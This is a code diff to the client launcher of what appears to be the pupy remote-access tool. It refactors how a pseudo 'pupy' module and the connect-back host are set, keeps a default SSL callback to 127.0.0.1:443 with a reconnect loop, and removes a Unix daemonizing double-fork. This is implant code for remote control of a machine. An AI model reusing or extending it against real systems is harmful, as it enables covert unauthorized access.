@@ -54,7 +54,22 @@ if sys.platform=="win32" and hasattr(sys, 'frozen') and sys.frozen:
 else:
     logging.getLogger().setLevel(logging.ERROR)
 
-DAEMONIZE=False
+
+def add_pseudo_pupy_module():
+    """ add a pseudo pupy module for *nix payloads """
+    if not "pupy" in sys.modules:
+        mod = imp.new_module("pupy")
+        mod.__name__="pupy"
+        mod.__file__="<memimport>\\\\pupy"
+        mod.__package__="pupy"
+        sys.modules["pupy"]=mod
+        mod.pseudo=True
+
+if "pupy" not in sys.modules:
+    add_pseudo_pupy_module()
+import pupy
+pupy.infos={} #global dictionary to store informations persistent through a deconnection
+
 LAUNCHER="connect" # the default launcher to start when no argv
 LAUNCHER_ARGS=shlex.split("--host 127.0.0.1:443 --transport ssl") # default launcher arguments
 
@@ -132,23 +147,16 @@ def get_next_wait(attempt):
         return random.randint(150,300)/10.0
 
 
-def add_pseudo_pupy_module(HOST):
-    """ add a pseudo pupy module for *nix payloads """
-    if not "pupy" in sys.modules:
-        mod = imp.new_module("pupy")
-        mod.__name__="pupy"
-        mod.__file__="<memimport>\\\\pupy"
-        mod.__package__="pupy"
-        sys.modules["pupy"]=mod
-        mod.get_connect_back_host=(lambda : HOST)
-        mod.pseudo=True
+
+def set_connect_back_host(HOST):
+    import pupy
+    pupy.get_connect_back_host=(lambda: HOST)
 
 attempt=0
 
 def main():
     global LAUNCHER
     global LAUNCHER_ARGS
-    global DAEMONIZE
     global attempt
 
     if len(sys.argv)>1:
@@ -167,7 +175,6 @@ def main():
 
     if "windows" in platform.system().lower():
         try:
-            import pupy
             config_file=pupy.get_pupy_config()
             exec config_file in globals()
         except ImportError:
@@ -180,23 +187,15 @@ def main():
             except LauncherError as e:
                 launcher.arg_parser.print_usage()
                 exit(str(e))
-
-            if "pupy" not in sys.modules:
-                add_pseudo_pupy_module(launcher.get_host())
+            if getattr(pupy, 'pseudo', False):
+                set_connect_back_host(launcher.get_host())
             else:
-                import pupy # necessary
                 pupy.get_connect_back_host=launcher.get_host
-            import pupy # also necessary
 
-            pupy.infos={} #global dictionary to store informations persistent through a deconnection
             pupy.infos['launcher']=LAUNCHER
             pupy.infos['launcher_args']=LAUNCHER_ARGS
             pupy.infos['launcher_inst']=launcher
             pupy.infos['transport']=launcher.get_transport()
-            if os.name == 'posix':
-                pupy.infos['daemonize']=DAEMONIZE
-            else:
-                pupy.infos['daemonize']='Default'
             rpyc_loop(launcher)
         finally:
             time.sleep(get_next_wait(attempt))
@@ -256,21 +255,6 @@ def rpyc_loop(launcher):
         return
 
 if __name__=="__main__":
-    if os.name == 'posix' and DAEMONIZE:
-        if os.fork():   # launch child and...
-            os._exit(0) # kill off parent
-        os.setsid()
-        if os.fork():   # launch child and...
-            os._exit(0) # kill off parent again.
-        os.umask(022)   # Don't allow others to write
-        null=os.open('/dev/null', os.O_RDWR)
-        for i in range(3):
-            try:
-                os.dup2(null, i)
-            except OSError, e:
-                if e.errno != errno.EBADF:
-                    raise
-        os.close(null)
 
     main()
 else:
